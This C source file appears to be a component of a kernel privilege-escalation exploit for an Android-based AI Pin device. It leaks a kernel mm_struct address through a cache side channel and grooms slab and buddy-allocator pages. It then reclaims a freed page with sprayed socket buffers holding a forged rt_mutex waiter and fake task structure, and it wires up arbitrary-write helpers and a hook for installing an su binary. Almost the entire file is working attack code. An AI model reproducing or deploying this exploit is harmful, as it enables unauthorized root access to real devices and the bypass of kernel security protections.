/*
 * SPDX-License-Identifier: Apache-2.0
 * Humane AI Pin reclaim implementation, 2026.
 *
 * Device-specific adaptation of the Apache-2.0 NebuSec GhostLock allocator
 * strategy. Changed for the AI Pin's merged 896-byte cache, dynamic
 * cpu_partial depth, and same-PFN perf-event gate.
 */
#include "common.h"

#include "kernelsnitch/kernelsnitch.h"
#include "perf_reclaim_gate.h"
#include "reclaim_hold.h"

static struct kernelsnitch_shared_state *ks_state;
static size_t objects_per_slab;
static size_t marker_slab_count;
static size_t spray_slab_count;
static unsigned char *payload_bytes;

static struct ghostlock_reclaim_batch reclaim_batch;
static struct ghostlock_reclaim_batch guard_batch;
static struct ghostlock_reclaim_batch absorb_batch;
static struct ghostlock_reclaim_batch shaping_batch;
static int batches_initialized;

static struct mm_ctx marker_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx before_ctx;
static struct mm_ctx after_ctx;

uintptr_t pselect_custom_value;
uintptr_t pselect_custom_target;
uintptr_t fake_task;
uintptr_t fake_w0;
uintptr_t fake_lock;
uintptr_t page_base;
int direct_root_cpu = -1;
int pselect_custom_shape;

uint64_t p0_linear_delta;
int p0_slide_leak;

static cpu_set_t original_affinity;
static int original_affinity_saved;

static int parse_u64_text(const char *text, int base, uint64_t *value) {
  if (!text || !*text || !value) {
    errno = EINVAL;
    return 0;
  }
  errno = 0;
  char *end = NULL;
  unsigned long long parsed = strtoull(text, &end, base);
  if (errno || end == text) {
    return 0;
  }
  while (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n') {
    ++end;
  }
  if (*end) {
    errno = EINVAL;
    return 0;
  }
  *value = (uint64_t)parsed;
  return 1;
}

int p0_env_init(void) {
  const char *base_text = getenv("AI_PIN_KASLR_BASE");
  uint64_t supplied_base = 0;
  if (!parse_u64_text(base_text, 0, &supplied_base) ||
      !is_kernel_ptr((uintptr_t)supplied_base) ||
      (supplied_base & (PAGE_SIZE - 1))) {
    pr_warning("AI_PIN_KASLR_BASE is missing or invalid\n");
    return 0;
  }
  const char *mode = getenv("AI_PIN_SLIDE_LEAK");
  if (mode && strcmp(mode, "2") != 0) {
    pr_warning("only the guarded virtual-address mode is supported\n");
    return 0;
  }

  kaslr_base = supplied_base;
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  p0_linear_delta = 0;
  p0_slide_leak = 2;
  pr_success("KASLR base accepted base=%016llx slide=%016llx\n",
             (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide);
  return 1;
}

uintptr_t p0_runtime_alias(uintptr_t image_addr) {
  uintptr_t image_offset = image_addr - KIMAGE_TEXT_BASE;
  return P0_PAGE_OFFSET + P0_KERNEL_PHYS_DELTA + image_offset;
}

/* Retained as no-op compatibility hooks; production proof uses perf events. */
int prepare_reclaim_trace_init(void) {
  return 1;
}

void prepare_reclaim_trace_close(void) {
}

static int write_reclaim_trace_marker(const char *message) {
  (void)message;
  return 1;
}

static int write_trace_control(char state) {
  (void)state;
  return 1;
}

static int read_decimal_file(const char *path, uint64_t *value) {
  char buffer[96];
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  ssize_t size = -1;
  if (fd >= 0) {
    size = read(fd, buffer, sizeof(buffer) - 1);
  }
  int saved_errno = errno;
  if (fd >= 0) {
    close(fd);
  }
  if (size <= 0) {
    errno = saved_errno;
    return 0;
  }
  buffer[size] = 0;
  return parse_u64_text(buffer, 10, value);
}

static int read_decimal_env(const char *name, uint64_t *value) {
  const char *text = getenv(name);
  if (!text) {
    errno = ENOENT;
    return 0;
  }
  return parse_u64_text(text, 10, value);
}

int init_direct_root_cpu(void) {
  if (sched_getaffinity(0, sizeof(original_affinity),
                        &original_affinity) != 0) {
    return 0;
  }
  original_affinity_saved = 1;

  long configured = sysconf(_SC_NPROCESSORS_CONF);
  if (configured < 1 || configured > CPU_SETSIZE) {
    configured = CPU_SETSIZE;
  }

  int selected = -1;
  uint64_t selected_frequency = 0;
  uint64_t selected_capacity = 0;
  for (int cpu = 0; cpu < configured; ++cpu) {
    if (!CPU_ISSET(cpu, &original_affinity)) {
      continue;
    }
    uint64_t online = 1;
    char path[160];
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/online", cpu);
    if (read_decimal_file(path, &online) && online == 0) {
      continue;
    }

    uint64_t frequency = 0;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpufreq/cpuinfo_max_freq", cpu);
    if (!read_decimal_file(path, &frequency)) {
      snprintf(path, sizeof(path),
               "/sys/devices/system/cpu/cpu%d/cpufreq/scaling_max_freq", cpu);
      (void)read_decimal_file(path, &frequency);
    }
    uint64_t capacity;
    capacity = 0;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpu_capacity", cpu);
    (void)read_decimal_file(path, &capacity);

    int better = selected < 0 || frequency > selected_frequency ||
                 (frequency == selected_frequency &&
                  capacity > selected_capacity) ||
                 (frequency == selected_frequency &&
                  capacity == selected_capacity && cpu > selected);
    if (better) {
      selected = cpu;
      selected_frequency = frequency;
      selected_capacity = capacity;
    }
  }

  if (selected < 0) {
    int current = sched_getcpu();
    if (current >= 0 && current < CPU_SETSIZE &&
        CPU_ISSET(current, &original_affinity)) {
      selected = current;
    }
  }
  if (selected < 0) {
    errno = ENODEV;
    return 0;
  }
  direct_root_cpu = selected;
  pr_success("runtime performance cpu=%d max_freq=%llu capacity=%llu\n",
             selected, (unsigned long long)selected_frequency,
             (unsigned long long)selected_capacity);
  return 1;
}

int restore_initial_affinity(void) {
  if (!original_affinity_saved) {
    errno = EINVAL;
    return 0;
  }
  return sched_setaffinity(0, sizeof(original_affinity),
                           &original_affinity) == 0;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buffer, size_t capacity) {
  if (!capacity) {
    return;
  }
  snprintf(buffer, capacity, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t count = read(fd, buffer, capacity - 1);
  int saved_errno = errno;
  close(fd);
  if (count <= 0) {
    errno = saved_errno;
    return;
  }
  buffer[count] = 0;
  buffer[strcspn(buffer, "\r\n")] = 0;
}

void log_startup_context(void) {
  char context[160];
  char enforcing[16];
  read_first_line("/proc/self/attr/current", context, sizeof(context));
  read_first_line("/sys/fs/selinux/enforce", enforcing, sizeof(enforcing));
  pr_success("startup pid=%d uid=%u context=%s enforcing=%s cpu=%d\n",
             getpid(), getuid(), context, enforcing, direct_root_cpu);
}

void log_slide_child_context(void) {
  pr_info("write child pid=%d uid=%u cpu=%d\n",
          getpid(), getuid(), direct_root_cpu);
}

void disable_rseq_for_thread(void) {
  /* Android 12 on this target has no userspace rseq registration to undo. */
  (void)0;
}

long futex_op(uint32_t *address, int operation, uint32_t value,
              const struct timespec *timeout, uint32_t *second_address,
              uint32_t third_value) {
  return syscall(SYS_futex, address, operation, value, timeout,
                 second_address, third_value);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr request;
  memset(&request, 0, sizeof(request));
  request.size = sizeof(request);
  request.sched_policy = SCHED_BATCH;
  request.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &request, 0);
}

uintptr_t p0_alias_image_offset(uintptr_t alias) {
  return alias - P0_PAGE_OFFSET - P0_KERNEL_PHYS_DELTA;
}

uintptr_t kaslr_image_addr(uintptr_t link_address) {
  return kaslr_base + (link_address - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t link_address) {
  return kaslr_image_addr(link_address);
}

uintptr_t canon_addr(uintptr_t link_address) {
  return kaslr_image_addr(link_address);
}

void set_pselect_write(uintptr_t target, uintptr_t value, int shape) {
  pselect_custom_shape = shape;
  pselect_custom_value = value;
  pselect_custom_target = target;
}

int pselect_write_shape(void) {
  int current_shape = pselect_custom_shape;
  return current_shape;
}

uintptr_t pselect_write_value(void) {
  uintptr_t current_value = pselect_custom_value;
  return current_value;
}

uintptr_t pselect_write_target(void) {
  uintptr_t current_target = pselect_custom_target;
  return current_target;
}

void put64(unsigned char *buffer, size_t offset, uint64_t value) {
  memcpy(buffer + offset, &value, sizeof(value));
}

void put32(unsigned char *buffer, size_t offset, uint32_t value) {
  memcpy(buffer + offset, &value, sizeof(value));
}

static pid_t spawn_parked_process(void) {
  pid_t pid = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (pid < 0) {
    return -1;
  }
  if (pid == 0) {
    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0 || getppid() == 1) {
      _exit(120);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return pid;
}

static pid_t spawn_collision_process(void) {
  pid_t pid = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (pid < 0) {
    return -1;
  }
  if (pid == 0) {
    pin_to_core((size_t)direct_root_cpu);
    kernelsnitch_find_collisions(ks_state);
    _exit(0);
  }
  return pid;
}

static int open_process_memory(pid_t pid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", pid);
  return open(path, O_RDONLY | O_CLOEXEC);
}

static int terminate_process(pid_t pid) {
  if (pid <= 0) {
    return 0;
  }
  (void)kill(pid, SIGKILL);
  while (waitpid(pid, NULL, 0) < 0) {
    if (errno != EINTR) {
      return 0;
    }
  }
  return 1;
}

static int allocate_pinned_mm(void) {
  pid_t child = spawn_parked_process();
  if (child < 0) {
    return -1;
  }
  int memory_fd = open_process_memory(child);
  int saved_errno = errno;
  terminate_process(child);
  errno = saved_errno;
  return memory_fd;
}

static void initialize_batches(void) {
  if (batches_initialized) {
    return;
  }
  ghostlock_reclaim_batch_init(&reclaim_batch);
  ghostlock_reclaim_batch_init(&guard_batch);
  ghostlock_reclaim_batch_init(&absorb_batch);
  ghostlock_reclaim_batch_init(&shaping_batch);
  batches_initialized = 1;
}

static void close_auxiliary_batches(void) {
  initialize_batches();
  ghostlock_reclaim_batch_close(&shaping_batch);
  ghostlock_reclaim_batch_close(&absorb_batch);
  ghostlock_reclaim_batch_close(&guard_batch);
}

void close_reclaim_sockets(void) {
  initialize_batches();
  close_auxiliary_batches();
  ghostlock_reclaim_batch_close(&reclaim_batch);
}

static int open_all_reclaim_sockets(void) {
  initialize_batches();
  size_t pairs = ghostlock_perf_gate_enabled()
                     ? SKB_PERF_GATE_RECLAIM_PAIRS
                     : SKB_RECLAIM_PAIRS;
  int ok = ghostlock_reclaim_batch_open(
               &reclaim_batch, pairs, GHOSTLOCK_RECLAIM_SNDBUF) == 0 &&
           ghostlock_reclaim_batch_open(
               &guard_batch, GHOSTLOCK_BUDDY_GUARD_PAIRS,
               GHOSTLOCK_RECLAIM_SNDBUF) == 0 &&
           ghostlock_reclaim_batch_open(
               &absorb_batch, SKB_ABSORB_PAIRS,
               GHOSTLOCK_RECLAIM_SNDBUF) == 0 &&
           ghostlock_reclaim_batch_open(
               &shaping_batch, 1, GHOSTLOCK_RECLAIM_SNDBUF) == 0;
  if (!ok) {
    int saved_errno = errno ? errno : EIO;
    close_reclaim_sockets();
    errno = saved_errno;
    return 0;
  }
  return 1;
}

static int prefill_small_pages(void) {
  size_t length = (size_t)RECLAIM_ORDER0_PREFILL_MB << 20;
  unsigned char *mapping = mmap(NULL, length, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (mapping == MAP_FAILED) {
    return 0;
  }
  for (size_t offset = 0; offset < length; offset += PAGE_SIZE) {
    mapping[offset] = 0;
  }
  return munmap(mapping, length) == 0;
}

static int hold_absorb_pages(void) {
  struct ghostlock_reclaim_result result;
  size_t requested = SKB_ABSORB_PAIRS * SKB_ABSORB_SENDS_PER_PAIR;
  (void)ghostlock_reclaim_hold_all(&absorb_batch, payload_bytes,
                                   SKB_RECLAIM_SIZE, requested, &result);
  return (int)result.sent;
}

static int hold_one_guard_page(void) {
  return ghostlock_reclaim_hold_one(&guard_batch, payload_bytes,
                                    SKB_RECLAIM_SIZE);
}

static void close_context(struct mm_ctx *ctx) {
  if (!ctx || !ctx->memfds) {
    return;
  }
  for (size_t i = 0; i < ctx->mm_cnt; ++i) {
    if (ctx->memfds[i] >= 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

static void destroy_context(struct mm_ctx *ctx) {
  if (!ctx) {
    return;
  }
  int *allocation = ctx->memfds;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
  free(allocation);
}

void cleanup_page_prepare_state(void) {
  close_context(&marker_ctx);
  close_context(&spray_ctx);
  close_context(&before_ctx);
  close_context(&after_ctx);
  destroy_context(&marker_ctx);
  destroy_context(&spray_ctx);
  destroy_context(&before_ctx);
  destroy_context(&after_ctx);
  free(payload_bytes);
  payload_bytes = NULL;
}

static int create_context(struct mm_ctx *ctx, size_t count) {
  ctx->mm_cnt = count;
  ctx->memfds = malloc(count * sizeof(*ctx->memfds));
  if (!ctx->memfds) {
    ctx->mm_cnt = 0;
    return 0;
  }
  for (size_t i = 0; i < count; ++i) {
    ctx->memfds[i] = -1;
  }
  return 1;
}

static int load_mm_geometry(void) {
  uint64_t object_size = 0;
  uint64_t slot_size = 0;
  uint64_t order = 0;
  uint64_t slab_objects = 0;
  uint64_t cpu_partial = 0;

  int from_sysfs =
      read_decimal_file("/sys/kernel/slab/mm_struct/object_size",
                        &object_size) &&
      read_decimal_file("/sys/kernel/slab/mm_struct/slab_size",
                        &slot_size) &&
      read_decimal_file("/sys/kernel/slab/mm_struct/order", &order) &&
      read_decimal_file("/sys/kernel/slab/mm_struct/objs_per_slab",
                        &slab_objects) &&
      read_decimal_file("/sys/kernel/slab/mm_struct/cpu_partial",
                        &cpu_partial);
  if (!from_sysfs) {
    int from_runner =
        read_decimal_env("AI_PIN_MM_OBJECT_SIZE", &object_size) &&
        read_decimal_env("AI_PIN_MM_SLAB_SIZE", &slot_size) &&
        read_decimal_env("AI_PIN_MM_ORDER", &order) &&
        read_decimal_env("AI_PIN_MM_OBJS_PER_SLAB", &slab_objects) &&
        read_decimal_env("AI_PIN_MM_CPU_PARTIAL", &cpu_partial);
    if (!from_runner) {
      pr_warning("mm_struct geometry is unavailable\n");
      return 0;
    }
  }

  if (object_size != MM_STRUCT_OBJECT_SZ || slot_size != MM_STRUCT_SZ ||
      order != MM_ORDER || slab_objects != objects_per_slab) {
    pr_warning("mm_struct geometry mismatch object=%llu slot=%llu order=%llu "
               "objects=%llu\n",
               (unsigned long long)object_size,
               (unsigned long long)slot_size,
               (unsigned long long)order,
               (unsigned long long)slab_objects);
    return 0;
  }

  marker_slab_count = (size_t)cpu_partial + 2;
  if (marker_slab_count < MM_PREPARE_SLABS_MIN) {
    marker_slab_count = MM_PREPARE_SLABS_MIN;
  }
  spray_slab_count = (size_t)cpu_partial + 1;
  if (marker_slab_count > MM_PREPARE_SLABS_MAX ||
      spray_slab_count > MM_PREPARE_SLABS_MAX) {
    return 0;
  }

  pr_info("mm geometry source=%s object=%llu slot=%llu order=%llu "
          "objects=%llu cpu_partial=%llu marker_slabs=%zu spray_slabs=%zu\n",
          from_sysfs ? "sysfs" : "runner",
          (unsigned long long)object_size,
          (unsigned long long)slot_size,
          (unsigned long long)order,
          (unsigned long long)slab_objects,
          (unsigned long long)cpu_partial,
          marker_slab_count, spray_slab_count);

  return create_context(&marker_ctx,
                        marker_slab_count * objects_per_slab) &&
         create_context(&spray_ctx,
                        spray_slab_count * objects_per_slab) &&
         create_context(&before_ctx, objects_per_slab - 1) &&
         create_context(&after_ctx, objects_per_slab);
}

static void write_seed_waiter(unsigned char *chunk) {
  put64(chunk, W0_OFF + WAITER_TREE_ENTRY_OFF, 1);
  put64(chunk, W0_OFF + WAITER_TREE_ENTRY_OFF + 8, 0);
  put64(chunk, W0_OFF + WAITER_TREE_ENTRY_OFF + 16, 0);
  put64(chunk, W0_OFF + WAITER_PI_TREE_ENTRY_OFF, 0);
  put64(chunk, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 8, 0);
  put64(chunk, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 16, 0);
  put64(chunk, W0_OFF + WAITER_TASK_OFF, fake_task);
  put64(chunk, W0_OFF + WAITER_LOCK_OFF, fake_lock);
  put32(chunk, W0_OFF + WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
  put64(chunk, W0_OFF + WAITER_DEADLINE_OFF, 0);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  (void)payload_mode;
  if (!payload_bytes || !base) {
    return 0;
  }
  memset(payload_bytes, 0, SKB_SEND_SIZE);
  uintptr_t first_byte = base + SKB_DATA_DELTA;
  fake_lock = first_byte + LOCK_OFF;
  fake_w0 = first_byte + W0_OFF;
  fake_task = first_byte + FAKE_TASK_OFF;

  for (size_t offset = 0; offset < SKB_SEND_SIZE; offset += ORDER3_SIZE) {
    unsigned char *chunk = payload_bytes + offset;
    put32(chunk, LOCK_OFF, 0);
    put64(chunk, LOCK_OFF + 8, fake_w0);
    put64(chunk, LOCK_OFF + 16, fake_w0);
    put64(chunk, LOCK_OFF + 24, 0);
    write_seed_waiter(chunk);

    put32(chunk, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(chunk, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(chunk, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(chunk, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    put64(chunk, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
    put64(chunk, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8, 0);
    put64(chunk, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, 0);
    put64(chunk, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, 0);
    put64(chunk, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
  }
  return 1;
}

static int fill_context(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; ++i) {
    ctx->memfds[i] = allocate_pinned_mm();
    if (ctx->memfds[i] < 0) {
      return 0;
    }
  }
  return 1;
}

static uintptr_t abandon_page_capture(void) {
  uintptr_t failure = 0;
  cleanup_page_prepare_state();
  close_reclaim_sockets();
  return failure;
}

static uintptr_t capture_controlled_page(int payload_mode) {
  close_reclaim_sockets();
  cleanup_page_prepare_state();
  if (!ghostlock_perf_gate_prepare_attempt()) {
    return 0;
  }

  objects_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  if (!open_all_reclaim_sockets() || !load_mm_geometry()) {
    return abandon_page_capture();
  }
  payload_bytes = calloc(1, SKB_SEND_SIZE);
  if (!payload_bytes || !fill_context(&marker_ctx) ||
      !fill_context(&spray_ctx)) {
    return abandon_page_capture();
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks_state = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count,
                                KSNITCH_COLLISIONS, 1, 0);
  if (!ks_state) {
    return abandon_page_capture();
  }

  int guards_sent = 0;
  for (size_t i = 0; i < before_ctx.mm_cnt; ++i) {
    before_ctx.memfds[i] = allocate_pinned_mm();
    if (before_ctx.memfds[i] < 0 || !hold_one_guard_page()) {
      break;
    }
    ++guards_sent;
  }
  if (guards_sent != (int)before_ctx.mm_cnt) {
    pr_warning("buddy guard incomplete sent=%d requested=%zu\n",
               guards_sent, before_ctx.mm_cnt);
    goto fail;
  }

  pid_t leak_process = spawn_collision_process();
  if (leak_process < 0 || !fill_context(&after_ctx)) {
    goto fail;
  }
  int leak_fd = open_process_memory(leak_process);
  if (leak_fd < 0) {
    terminate_process(leak_process);
    goto fail;
  }
  while (waitpid(leak_process, NULL, 0) < 0 && errno == EINTR) {
  }

  if (!kernelsnitch_found_collisions(ks_state)) {
    pr_warning("KernelSnitch collision discovery failed\n");
    close(leak_fd);
    goto fail;
  }
  kernelsnitch_bruteforce(ks_state);
  uintptr_t leaked_mm = ks_state->mm_struct;
  if (leaked_mm == (uintptr_t)-1) {
    close(leak_fd);
    goto fail;
  }

  uintptr_t base = leaked_mm & ~(ORDER3_SIZE - 1);
  pr_info("mm leak=%016zx page=%016zx object_index=%zu\n",
          leaked_mm, base,
          (size_t)((leaked_mm - base) / MM_STRUCT_SZ));
  if (!base || ((leaked_mm - base) & 7) ||
      !prepare_skb_payload(base, payload_mode) ||
      !ghostlock_perf_gate_configure(base)) {
    close(leak_fd);
    goto fail;
  }

  if (!ghostlock_reclaim_hold_one(&shaping_batch, payload_bytes,
                                  SKB_RECLAIM_SIZE)) {
    close(leak_fd);
    goto fail;
  }

  pin_to_core(CORE);
  for (int i = 0; i < 4; ++i) {
    sched_yield();
  }
  close_context(&before_ctx);
  for (size_t i = 0; i + 1 < after_ctx.mm_cnt; ++i) {
    close(after_ctx.memfds[i]);
    after_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += objects_per_slab) {
    close(spray_ctx.memfds[i]);
    spray_ctx.memfds[i] = -1;
  }
  ghostlock_reclaim_batch_close(&shaping_batch);
  for (int i = 0; i < 4; ++i) {
    sched_yield();
  }

  int prefill_ok = prefill_small_pages();
  int absorb_sent = hold_absorb_pages();
  int free_armed = ghostlock_perf_gate_begin_free();
  int close_ok = close(leak_fd) == 0;
  leak_fd = -1;

  struct ghostlock_marker_result marker_result;
  int markers_ok = ghostlock_close_slab_markers(
      marker_ctx.memfds, marker_ctx.mm_cnt, objects_per_slab,
      &marker_result);
  int allocation_armed = free_armed &&
      ghostlock_perf_gate_finish_free_begin_alloc();

  struct ghostlock_reclaim_result reclaim_result;
  memset(&reclaim_result, 0, sizeof(reclaim_result));
  reclaim_result.requested = SKB_PERF_GATE_RECLAIM_SENDS;
  reclaim_result.failed_pair = -1;
  int capture_seen = 0;
  if (allocation_armed) {
    for (size_t i = 0; i < reclaim_result.requested; ++i) {
      if (!ghostlock_reclaim_hold_one(&reclaim_batch, payload_bytes,
                                      SKB_RECLAIM_SIZE)) {
        reclaim_result.first_errno = errno ? errno : EIO;
        break;
      }
      ++reclaim_result.sent;
      ++reclaim_result.sent_per_pair[i % reclaim_batch.pair_count];
      if ((reclaim_result.sent % SKB_PERF_GATE_POLL_INTERVAL) == 0) {
        int poll = ghostlock_perf_gate_poll_alloc();
        if (poll < 0) {
          reclaim_result.first_errno = errno ? errno : EIO;
          break;
        }
        if (poll > 0) {
          capture_seen = 1;
          break;
        }
      }
    }
  }
  int capture_finished = allocation_armed &&
                         ghostlock_perf_gate_finish_alloc();
  const struct ghostlock_perf_gate_result *perf =
      ghostlock_perf_gate_result();
  pr_info("perf reclaim gate result verified=%d pfn=%llx memstart=%016llx "
          "free=%llu alloc=%llu candidates=%zu errno=%d\n",
          perf->capture_verified,
          (unsigned long long)perf->matched_pfn,
          (unsigned long long)perf->matched_memstart,
          (unsigned long long)perf->free_count,
          (unsigned long long)perf->alloc_count,
          perf->candidate_count, reclaim_result.first_errno);
  pr_info("reclaim sends=%zu/%zu guards=%d/%zu prefill=%d absorb=%d/%d "
          "markers=%zu/%zu capture=%d\n",
          reclaim_result.sent, reclaim_result.requested,
          guards_sent, before_ctx.mm_cnt, prefill_ok, absorb_sent,
          SKB_ABSORB_PAIRS * SKB_ABSORB_SENDS_PER_PAIR,
          marker_result.closed, marker_result.requested, capture_seen);

  close_auxiliary_batches();
  kernelsnitch_cleanup(ks_state);
  ks_state = NULL;
  close_context(&marker_ctx);

  int complete = close_ok && prefill_ok && markers_ok && capture_seen &&
                 capture_finished && perf->capture_verified &&
                 absorb_sent ==
                     SKB_ABSORB_PAIRS * SKB_ABSORB_SENDS_PER_PAIR;
  if (!complete) {
    return abandon_page_capture();
  }
  return base;

fail:
  if (ks_state) {
    kernelsnitch_cleanup(ks_state);
    ks_state = NULL;
  }
  return abandon_page_capture();
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int attempts = payload_mode == PAGE_PAYLOAD_READ
                     ? SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS
                     : FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  for (int attempt = 1; attempt <= attempts; ++attempt) {
    uintptr_t base = capture_controlled_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("reclaim retry attempt=%d/%d mode=%d\n",
               attempt, attempts, payload_mode);
  }
  uintptr_t no_page = 0;
  return no_page;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffffff8000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE;
}
